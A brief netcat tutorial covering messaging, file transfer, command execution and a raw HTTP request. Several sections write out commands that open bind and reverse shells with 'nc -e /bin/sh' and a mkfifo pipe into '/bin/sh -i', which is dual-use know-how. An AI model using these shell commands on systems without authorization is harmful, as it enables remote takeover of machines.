Netcat
======

Netcat is a utility to do anything involving tcp/udp or any unix socket.

## Create simple network to send messages

On server:
```
    nc -l -p 1101
    # server will tcp port on port 1101  
        
    -l  listen
    -p  port
    -w  timeout in seconds
```

On client:
```
    nc <server ip> 1101
```
This will create a simple connection between server and
client.

## Transfer files using netcat
On server:
```
    nc -l -p 1101 < <file>
    # Server will server <file> on port 1101
    
    -N  disconnect after file transfer
```
On client:
```
    nc <server ip> 1101 > <out file>
```

Server will send <file> only once. File can also be transferred
from client to server.

## Sending shell commands through netcat

Gnu netcat does not ship with exec command feature. Get freebsd netcat
 or nmap ncat for this feature.

### Executing a command on server
On server:
```
    nc -l -p 1101 -e /bin/echo "hello netcat"

    -e  pecify program to exec after connect
```
On client:
```
    nc <server ip> 1101
```

`/bin/echo "hello netcat"` will run on server and result will be
shown to client.

### Sending shell

Send shell to client. Client can run commands (remotely) on the server. 
SSH is better for remote shell access.

On server:
```
    nc -l -p 1101 -e /bin/sh
        
    -e  pecify program to exec after connection
```
```
On client:
    $ nc <server ip> 1101 
```


### Getting reverse shell

On server:
```
    $ nc -l -p 1101
```
On client:
```
    $ nc <server ip> 1101 -e /bin/sh
```

Server gets client shell. Server can execute commands on
client.

### Reverse shell on any netcat

On server first create a named pipe file using `mkfifo` [see man page].
```
    $ mkfifo /tmp/fifo_
```
then

On server:
```
    cat /tmp/fifo_ | /bin/sh -i 2>&1 | nc -l -p 1101 > /tmp/fifo_
```
On client:
```
    nc <server ip> 1101 
```

## HTTP request
```
    $ echo -e "GET / HTTP/1.0\r\n example.com:80\r\n\r\n" | nc example.com 80 
```

## Further reading:

- Netcat manpage
- https://en.wikipedia.org/wiki/Netcat
